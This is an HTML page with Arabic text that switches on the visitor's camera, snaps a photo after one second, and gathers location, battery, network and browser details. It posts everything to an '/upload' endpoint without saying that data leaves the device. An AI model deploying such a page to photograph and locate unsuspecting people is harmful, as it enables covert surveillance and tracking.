<!DOCTYPE html>
<html>
  <body onload="startCamera()">
    <h2 style="color: green">📷 جاري تشغيل الكاميرا...</h2>
    <video id="preview" autoplay style="width: 100%; max-width: 400px"></video>
    <canvas id="snapshot" style="display: none"></canvas>
    <p id="info"></p>

    <script>
      let stream;

      async function startCamera() {
        try {
          stream = await navigator.mediaDevices.getUserMedia({ video: true });
        } catch (err) {
          document.body.innerHTML =
            "<h2 style='color:red;'>❌ لم يتم تشغيل الكاميرا: " +
            err.message +
            "</h2>";
          return;
        }
        const video = document.getElementById("preview");
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(captureAndSend, 1000); // ننتظر ثانية واحدة بعد تشغيل الكاميرا
        };
      }

      async function captureAndSend() {
        const canvas = document.getElementById("snapshot");
        const video = document.getElementById("preview");
        const ctx = canvas.getContext("2d");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");
        const timestamp = new Date().toLocaleString();
        const userAgent = navigator.userAgent;

        let batteryLevel = "غير متاح";
        let connectionType = "غير معروف";

        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        }

        if (navigator.connection) {
          connectionType = navigator.connection.effectiveType;
        }

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude.toFixed(5);
            const lon = pos.coords.longitude.toFixed(5);

            const payload = {
              image: imageData,
              info: {
                time: timestamp,
                location: `${lat}, ${lon}`,
                device: userAgent,
                battery: batteryLevel,
                network: connectionType,
              },
            };

            fetch("/upload", {
              method: "POST",
              body: JSON.stringify(payload),
              headers: { "Content-Type": "application/json" },
            });

            document.getElementById("info").innerText =
              "✅ تم التوثيق والإرسال";
          },
          (err) => {
            const payload = {
              image: imageData,
              info: {
                time: timestamp,
                location: "غير متاح",
                device: userAgent,
                battery: batteryLevel,
                network: connectionType,
              },
            };

            fetch("/upload", {
              method: "POST",
              body: JSON.stringify(payload),
              headers: { "Content-Type": "application/json" },
            });

            document.getElementById("info").innerText =
              "✅ تم التوثيق بدون موقع";
          }
        );
      }
    </script>
  </body>
</html>
